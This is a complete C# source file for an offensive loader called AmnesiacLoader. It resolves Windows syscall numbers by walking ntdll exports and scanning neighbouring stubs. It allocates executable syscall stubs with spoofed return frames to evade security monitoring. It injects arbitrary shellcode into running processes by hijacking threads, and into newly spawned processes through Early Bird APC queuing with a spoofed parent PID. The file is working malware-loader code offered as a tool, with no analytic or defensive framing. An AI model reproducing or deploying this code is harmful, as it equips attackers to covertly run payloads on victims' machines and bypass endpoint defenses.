// AmnesiacLoader — Indirect Syscall Injection Engine
// SSN resolution: EAT walking (Hell's Gate) + neighbor scan fallback (Halo's Gate)
// Syscall stubs:  RWX-allocated 48-byte native stubs with two spoofed return frames (ntdll + kernelbase)
// Injection:      Thread hijacking (InjectShellcode), Early Bird APC (InjectNewProcess)

using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace AmnesiacLoader
{
    // ── Shared NT / Win32 structures ─────────────────────────────────────────────

    [StructLayout(LayoutKind.Sequential)]
    struct OBJECT_ATTRIBUTES
    {
        public int    Length;
        public IntPtr RootDirectory;
        public IntPtr ObjectName;
        public uint   Attributes;
        public IntPtr SecurityDescriptor;
        public IntPtr SecurityQoS;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFO
    {
        public int    cb;
        public IntPtr lpReserved, lpDesktop, lpTitle;
        public int    dwX, dwY, dwXSize, dwYSize;
        public int    dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public short  wShowWindow, cbReserved2;
        public IntPtr lpReserved2, hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr      lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess, hThread;
        public int    dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct THREADENTRY32
    {
        public int  dwSize, cntUsage;
        public uint th32ThreadID, th32OwnerProcessID;
        public int  tpBasePri, tpDeltaPri, dwFlags;
    }

    // ── Syscall delegate types ────────────────────────────────────────────────────

    delegate uint NtOpenProcessDelegate(
        out IntPtr processHandle, uint desiredAccess,
        ref OBJECT_ATTRIBUTES objectAttributes, ref CLIENT_ID clientId);

    delegate uint NtAllocateVirtualMemoryDelegate(
        IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits,
        ref IntPtr regionSize, uint allocationType, uint protect);

    delegate uint NtWriteVirtualMemoryDelegate(
        IntPtr processHandle, IntPtr baseAddress,
        byte[] buffer, uint bufferSize, out uint bytesWritten);

    delegate uint NtProtectVirtualMemoryDelegate(
        IntPtr processHandle, ref IntPtr baseAddress,
        ref IntPtr regionSize, uint newProtect, out uint oldProtect);

    delegate uint NtSuspendThreadDelegate(IntPtr threadHandle, out uint previousCount);
    delegate uint NtResumeThreadDelegate(IntPtr threadHandle,  out uint previousCount);
    delegate uint NtGetContextThreadDelegate(IntPtr threadHandle, IntPtr context);
    delegate uint NtSetContextThreadDelegate(IntPtr threadHandle, IntPtr context);

    delegate uint NtCreateThreadExDelegate(
        out IntPtr threadHandle, uint desiredAccess, IntPtr objectAttributes,
        IntPtr processHandle, IntPtr startAddress, IntPtr parameter,
        uint flags, IntPtr zeroBits, IntPtr stackSize,
        IntPtr maximumStackSize, IntPtr attributeList);

    delegate uint NtQueueApcThreadDelegate(
        IntPtr threadHandle, IntPtr apcRoutine,
        IntPtr arg1, IntPtr arg2, IntPtr arg3);

    // ── SyscallResolver ───────────────────────────────────────────────────────────

    static class SyscallResolver
    {
        static readonly Dictionary<string, ushort> _cache = new Dictionary<string, ushort>();
        static readonly Dictionary<string, IntPtr>  _stubs = new Dictionary<string, IntPtr>();
        static List<KeyValuePair<uint, string>> _sortedNt;
        static IntPtr _ntdllBase = IntPtr.Zero;

        [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32.dll")] static extern IntPtr VirtualAlloc(
            IntPtr addr, UIntPtr size, uint allocType, uint protect);

        const uint MEM_COMMIT_RESERVE    = 0x3000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        // ── Stub allocator ────────────────────────────────────────────────────────
        // Allocates a 48-byte RWX syscall stub with two spoofed return frames:
        //   sub rsp, 16                ; make room for 2 fake frames
        //   mov rax, <kbaseGadget>     ; outermost frame (kernelbase.dll)
        //   mov [rsp+8], rax
        //   mov rax, <ntdllGadget>     ; innermost frame (ntdll.dll), adjacent to syscall
        //   mov [rsp], rax
        //   mov r10, rcx
        //   mov eax, <ssn>
        //   syscall
        //   add rsp, 16
        //   ret
        // Call stack at syscall: [kernelbase_gadget] -> [ntdll_gadget] -> syscall

        internal static IntPtr AllocateStub(ushort ssn, IntPtr ntdllGadget, IntPtr kbaseGadget)
        {
            IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)64, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
            if (mem == IntPtr.Zero) throw new InvalidOperationException("VirtualAlloc failed for syscall stub");

            unsafe
            {
                byte* p = (byte*)mem.ToPointer();
                int   i = 0;

                // sub rsp, 16  (4 bytes)
                p[i++]=0x48; p[i++]=0x83; p[i++]=0xEC; p[i++]=0x10;

                // mov rax, kbaseGadget  (10 bytes) — outermost frame
                p[i++]=0x48; p[i++]=0xB8;
                long kg = kbaseGadget.ToInt64();
                for (int b = 0; b < 8; b++) { p[i++] = (byte)(kg & 0xFF); kg >>= 8; }

                // mov [rsp+8], rax  (5 bytes)
                p[i++]=0x48; p[i++]=0x89; p[i++]=0x44; p[i++]=0x24; p[i++]=0x08;

                // mov rax, ntdllGadget  (10 bytes) — innermost frame
                p[i++]=0x48; p[i++]=0xB8;
                long ng = ntdllGadget.ToInt64();
                for (int b = 0; b < 8; b++) { p[i++] = (byte)(ng & 0xFF); ng >>= 8; }

                // mov [rsp], rax  (4 bytes)
                p[i++]=0x48; p[i++]=0x89; p[i++]=0x04; p[i++]=0x24;

                // mov r10, rcx  (3 bytes)
                p[i++]=0x4C; p[i++]=0x8B; p[i++]=0xD1;

                // mov eax, ssn  (5 bytes)
                p[i++]=0xB8; p[i++]=(byte)(ssn&0xFF); p[i++]=(byte)(ssn>>8); p[i++]=0x00; p[i++]=0x00;

                // syscall  (2 bytes)
                p[i++]=0x0F; p[i++]=0x05;

                // add rsp, 16  (4 bytes)
                p[i++]=0x48; p[i++]=0x83; p[i++]=0xC4; p[i++]=0x10;

                // ret  (1 byte)
                p[i++]=0xC3;
            }
            return mem;
        }

        // ── EAT walker ────────────────────────────────────────────────────────────

        static unsafe void EnsureNtdll()
        {
            if (_ntdllBase != IntPtr.Zero) return;
            _ntdllBase = GetModuleHandle("ntdll.dll");
            if (_ntdllBase == IntPtr.Zero) return;
            _sortedNt = new List<KeyValuePair<uint, string>>();

            byte* basePtr   = (byte*)_ntdllBase.ToPointer();
            int   peOffset  = *(int*)(basePtr + 0x3C);
            // DataDirectory[0].VirtualAddress for PE32+: PE+0x18(OptHdr)+0x70(ExportTable) = PE+0x88
            uint  expRVA    = *(uint*)(basePtr + peOffset + 0x88);
            byte* expDir    = basePtr + expRVA;

            uint numNames     = *(uint*)(expDir + 0x18);
            uint addrFuncs    = *(uint*)(expDir + 0x1C);
            uint addrNames    = *(uint*)(expDir + 0x20);
            uint addrOrdinals = *(uint*)(expDir + 0x24);

            for (uint i = 0; i < numNames; i++)
            {
                uint   nameRVA = *(uint*)(basePtr + addrNames + i * 4);
                string name    = Marshal.PtrToStringAnsi(new IntPtr(basePtr + nameRVA));
                if (name == null || name.Length < 3) continue;
                if (name[0] != 'N' || name[1] != 't') continue;

                ushort ordinal = *(ushort*)(basePtr + addrOrdinals + i * 2);
                uint   funcRVA = *(uint*)(basePtr + addrFuncs + ordinal * 4);
                _sortedNt.Add(new KeyValuePair<uint, string>(funcRVA, name));
            }
            // Sort by RVA — syscall numbers increase monotonically with address
            _sortedNt.Sort((a, b) => a.Key.CompareTo(b.Key));
        }

        static unsafe ushort ExtractSSN(byte* func)
        {
            // Standard unhooked prelude: 4C 8B D1 B8 [ssn_lo] [ssn_hi] 00 00
            if (func[0]==0x4C && func[1]==0x8B && func[2]==0xD1 && func[3]==0xB8)
                return *(ushort*)(func + 4);
            return 0xFFFF;
        }

        public static unsafe ushort Resolve(string functionName)
        {
            ushort cached;
            if (_cache.TryGetValue(functionName, out cached)) return cached;

            EnsureNtdll();
            if (_ntdllBase == IntPtr.Zero) return 0xFFFF;

            byte* basePtr  = (byte*)_ntdllBase.ToPointer();
            int   targetIdx = -1;
            for (int i = 0; i < _sortedNt.Count; i++)
            {
                if (_sortedNt[i].Value == functionName) { targetIdx = i; break; }
            }
            if (targetIdx < 0) return 0xFFFF;

            byte* targetFunc = basePtr + _sortedNt[targetIdx].Key;
            ushort ssn = ExtractSSN(targetFunc);
            if (ssn != 0xFFFF) { _cache[functionName] = ssn; return ssn; }

            // Halo's Gate: scan neighbors for unhooked stub, derive SSN by offset
            for (int delta = 1; delta < 20; delta++)
            {
                if (targetIdx - delta >= 0)
                {
                    byte*  nb  = basePtr + _sortedNt[targetIdx - delta].Key;
                    ushort nb_ssn = ExtractSSN(nb);
                    if (nb_ssn != 0xFFFF)
                    { ssn = (ushort)(nb_ssn + delta); _cache[functionName] = ssn; return ssn; }
                }
                if (targetIdx + delta < _sortedNt.Count)
                {
                    byte*  nb  = basePtr + _sortedNt[targetIdx + delta].Key;
                    ushort nb_ssn = ExtractSSN(nb);
                    if (nb_ssn != 0xFFFF)
                    { ssn = (ushort)(nb_ssn - delta); _cache[functionName] = ssn; return ssn; }
                }
            }
            return 0xFFFF;
        }

        public static T GetStub<T>(string name) where T : class
        {
            IntPtr stub;
            if (!_stubs.TryGetValue(name, out stub))
            {
                ushort ssn         = Resolve(name);
                if (ssn == 0xFFFF) throw new InvalidOperationException("Could not resolve SSN for: " + name);
                IntPtr ntdllGadget = CallStack.GetGadget();
                IntPtr kbaseGadget = CallStack.GetKernelbaseGadget();
                stub = AllocateStub(ssn, ntdllGadget, kbaseGadget);
                _stubs[name] = stub;
            }
            return Marshal.GetDelegateForFunctionPointer(stub, typeof(T)) as T;
        }
    }

    // ── Injector ──────────────────────────────────────────────────────────────────

    public class Injector
    {
        const uint PROCESS_ALL_ACCESS  = 0x001FFFFF;
        const uint THREAD_ALL_ACCESS   = 0x001FFFFF;
        const uint MEM_COMMIT          = 0x1000;
        const uint MEM_RESERVE         = 0x2000;
        const uint PAGE_READWRITE      = 0x04;
        const uint PAGE_EXECUTE_READ   = 0x20;
        const uint CREATE_SUSPENDED    = 0x00000004;
        const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
        const uint TH32CS_SNAPTHREAD   = 0x00000004;

        const long PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

        // x64 CONTEXT offsets
        const int CTX_FLAGS  = 0x30;
        const int CTX_RSP    = 0xF0;
        const int CTX_RIP    = 0xF8;
        const int CTX_SIZE   = 0x4D0;
        const int CONTEXT_FULL = 0x0010000B;

        [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
        [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint access, bool inherit, int pid);
        [DllImport("kernel32.dll")] static extern IntPtr OpenThread(uint access, bool inherit, uint tid);
        [DllImport("kernel32.dll")] static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint pid);
        [DllImport("kernel32.dll")] static extern bool Thread32First(IntPtr snap, ref THREADENTRY32 te);
        [DllImport("kernel32.dll")] static extern bool Thread32Next(IntPtr snap, ref THREADENTRY32 te);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcessW(
            string lpApplicationName, string lpCommandLine,
            IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
            bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory,
            ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll")]
        static extern bool InitializeProcThreadAttributeList(
            IntPtr list, int count, int flags, ref IntPtr size);

        [DllImport("kernel32.dll")]
        static extern bool UpdateProcThreadAttribute(
            IntPtr list, uint flags, IntPtr attribute,
            IntPtr value, IntPtr cbSize, IntPtr prev, IntPtr retSize);

        [DllImport("kernel32.dll")]
        static extern void DeleteProcThreadAttributeList(IntPtr list);

        // ── InjectShellcode — thread context hijacking ────────────────────────────

        public static bool InjectShellcode(int pid, byte[] shellcode)
        {
            try
            {
                var NtOpenProcess = SyscallResolver.GetStub<NtOpenProcessDelegate>("NtOpenProcess");
                var NtAlloc       = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
                var NtWrite       = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
                var NtProtect     = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
                var NtSuspend     = SyscallResolver.GetStub<NtSuspendThreadDelegate>("NtSuspendThread");
                var NtResume      = SyscallResolver.GetStub<NtResumeThreadDelegate>("NtResumeThread");
                var NtGetCtx      = SyscallResolver.GetStub<NtGetContextThreadDelegate>("NtGetContextThread");
                var NtSetCtx      = SyscallResolver.GetStub<NtSetContextThreadDelegate>("NtSetContextThread");

                // Open target process
                IntPtr hProcess = IntPtr.Zero;
                var    oa       = new OBJECT_ATTRIBUTES { Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)) };
                var    cid      = new CLIENT_ID { UniqueProcess = new IntPtr(pid) };
                uint   status   = NtOpenProcess(out hProcess, PROCESS_ALL_ACCESS, ref oa, ref cid);
                if (status != 0 || hProcess == IntPtr.Zero) return false;

                // Allocate RW region
                IntPtr baseAddr   = IntPtr.Zero;
                IntPtr regionSize = new IntPtr(shellcode.Length);
                status = NtAlloc(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize,
                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (status != 0) { CloseHandle(hProcess); return false; }

                // Write shellcode
                uint written;
                status = NtWrite(hProcess, baseAddr, shellcode, (uint)shellcode.Length, out written);
                if (status != 0 || written != (uint)shellcode.Length)
                { CloseHandle(hProcess); return false; }

                // Protect RX
                IntPtr protBase = baseAddr;
                IntPtr protSize = new IntPtr(shellcode.Length);
                uint   oldProt;
                NtProtect(hProcess, ref protBase, ref protSize, PAGE_EXECUTE_READ, out oldProt);

                // Find a thread in the target process
                uint targetTid = FindThreadInProcess((uint)pid);
                if (targetTid == 0) { CloseHandle(hProcess); return false; }

                IntPtr hThread = OpenThread(THREAD_ALL_ACCESS, false, targetTid);
                if (hThread == IntPtr.Zero) { CloseHandle(hProcess); return false; }

                // Suspend + get context
                uint prevCount;
                NtSuspend(hThread, out prevCount);

                IntPtr rawCtx  = Marshal.AllocHGlobal(CTX_SIZE + 16);
                long   aligned = (rawCtx.ToInt64() + 15) & ~15L;
                IntPtr ctx     = new IntPtr(aligned);
                for (int i = 0; i < CTX_SIZE; i++) Marshal.WriteByte(ctx, i, 0);
                Marshal.WriteInt32(ctx, CTX_FLAGS, CONTEXT_FULL);
                status = NtGetCtx(hThread, ctx);

                if (status == 0)
                {
                    unsafe
                    {
                        byte* p = (byte*)ctx.ToPointer();
                        long  origRsp = *(long*)(p + CTX_RSP);
                        long  origRip = *(long*)(p + CTX_RIP);

                        // Push original RIP as return address for shellcode
                        origRsp -= 8;
                        byte[] ripBytes = BitConverter.GetBytes(origRip);
                        uint   w2;
                        NtWrite(hProcess, new IntPtr(origRsp), ripBytes, 8, out w2);
                        *(long*)(p + CTX_RSP) = origRsp;
                        *(long*)(p + CTX_RIP) = baseAddr.ToInt64();
                    }
                    NtSetCtx(hThread, ctx);
                }

                Marshal.FreeHGlobal(rawCtx);
                NtResume(hThread, out prevCount);
                CloseHandle(hThread);
                CloseHandle(hProcess);
                return status == 0;
            }
            catch { return false; }
        }

        static uint FindThreadInProcess(uint pid)
        {
            IntPtr snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            if (snap == IntPtr.Zero) return 0;
            var te = new THREADENTRY32 { dwSize = Marshal.SizeOf(typeof(THREADENTRY32)) };
            if (Thread32First(snap, ref te))
            {
                do
                {
                    if (te.th32OwnerProcessID == pid) { CloseHandle(snap); return te.th32ThreadID; }
                } while (Thread32Next(snap, ref te));
            }
            CloseHandle(snap);
            return 0;
        }

        // ── InjectNewProcess — Early Bird APC + PPID spoof ────────────────────────

        public static bool InjectNewProcess(string processPath, byte[] shellcode, int spoofParentPid)
        {
            try
            {
                var NtAlloc   = SyscallResolver.GetStub<NtAllocateVirtualMemoryDelegate>("NtAllocateVirtualMemory");
                var NtWrite   = SyscallResolver.GetStub<NtWriteVirtualMemoryDelegate>("NtWriteVirtualMemory");
                var NtProtect = SyscallResolver.GetStub<NtProtectVirtualMemoryDelegate>("NtProtectVirtualMemory");
                var NtQueue   = SyscallResolver.GetStub<NtQueueApcThreadDelegate>("NtQueueApcThread");
                var NtResume  = SyscallResolver.GetStub<NtResumeThreadDelegate>("NtResumeThread");

                // Build PROC_THREAD_ATTRIBUTE_LIST for PPID spoof
                IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
                if (parentHandle == IntPtr.Zero) return false;

                IntPtr attrListSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);
                IntPtr attrList = Marshal.AllocHGlobal(attrListSize.ToInt32());

                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
                { Marshal.FreeHGlobal(attrList); CloseHandle(parentHandle); return false; }

                // Pin handle value so the pointer stays valid during CreateProcessW
                GCHandle pin = GCHandle.Alloc(parentHandle, GCHandleType.Pinned);
                UpdateProcThreadAttribute(
                    attrList, 0,
                    new IntPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                    pin.AddrOfPinnedObject(),
                    new IntPtr(IntPtr.Size),
                    IntPtr.Zero, IntPtr.Zero);

                var si = new STARTUPINFOEX();
                si.StartupInfo.cb  = Marshal.SizeOf(typeof(STARTUPINFOEX));
                si.lpAttributeList = attrList;

                PROCESS_INFORMATION pi;
                bool created = CreateProcessW(
                    processPath, null,
                    IntPtr.Zero, IntPtr.Zero, false,
                    CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero, null, ref si, out pi);

                pin.Free();
                DeleteProcThreadAttributeList(attrList);
                Marshal.FreeHGlobal(attrList);
                CloseHandle(parentHandle);

                if (!created) return false;

                // Allocate RW in new process
                IntPtr baseAddr   = IntPtr.Zero;
                IntPtr regionSize = new IntPtr(shellcode.Length);
                uint   status     = NtAlloc(pi.hProcess, ref baseAddr, IntPtr.Zero,
                                            ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                if (status != 0) { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false; }

                // Write shellcode
                uint written;
                status = NtWrite(pi.hProcess, baseAddr, shellcode, (uint)shellcode.Length, out written);
                if (status != 0 || written != (uint)shellcode.Length)
                { CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false; }

                // Protect RX
                IntPtr protBase = baseAddr;
                IntPtr protSize = new IntPtr(shellcode.Length);
                uint   oldProt;
                NtProtect(pi.hProcess, ref protBase, ref protSize, PAGE_EXECUTE_READ, out oldProt);

                // Queue Early Bird APC to the suspended main thread — fires before any user code
                NtQueue(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                // Resume — APC executes shellcode before process entry point
                uint prev;
                NtResume(pi.hThread, out prev);

                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return true;
            }
            catch { return false; }
        }

        // ── SpawnWithPPID — create process with spoofed parent, no suspension/APC ──

        public static bool SpawnWithPPID(string cmdLine, int spoofParentPid)
        {
            try
            {
                IntPtr parentHandle = OpenProcess(PROCESS_ALL_ACCESS, false, spoofParentPid);
                if (parentHandle == IntPtr.Zero) return false;

                IntPtr attrListSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attrListSize);
                IntPtr attrList = Marshal.AllocHGlobal(attrListSize.ToInt32());
                if (!InitializeProcThreadAttributeList(attrList, 1, 0, ref attrListSize))
                { Marshal.FreeHGlobal(attrList); CloseHandle(parentHandle); return false; }

                GCHandle pin = GCHandle.Alloc(parentHandle, GCHandleType.Pinned);
                UpdateProcThreadAttribute(
                    attrList, 0,
                    new IntPtr(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS),
                    pin.AddrOfPinnedObject(),
                    new IntPtr(IntPtr.Size),
                    IntPtr.Zero, IntPtr.Zero);

                var si = new STARTUPINFOEX();
                si.StartupInfo.cb  = Marshal.SizeOf(typeof(STARTUPINFOEX));
                si.lpAttributeList = attrList;

                PROCESS_INFORMATION pi;
                bool created = CreateProcessW(
                    null, cmdLine,
                    IntPtr.Zero, IntPtr.Zero, false,
                    EXTENDED_STARTUPINFO_PRESENT,
                    IntPtr.Zero, null, ref si, out pi);

                pin.Free();
                DeleteProcThreadAttributeList(attrList);
                Marshal.FreeHGlobal(attrList);
                CloseHandle(parentHandle);

                if (created) { CloseHandle(pi.hThread); CloseHandle(pi.hProcess); }
                return created;
            }
            catch { return false; }
        }

        // ── CLR hosting wrappers (delegated to UnmanagedPS) ───────────────────────

        public static bool InjectUnmanagedPS(int pid, string psScript)
        {
            return UnmanagedPS.InjectUnmanagedPS(pid, psScript);
        }

        public static bool SpawnUnmanagedPS(string processPath, string psScript, int spoofParentPid)
        {
            return UnmanagedPS.SpawnUnmanagedPS(processPath, psScript, spoofParentPid);
        }
    }
}
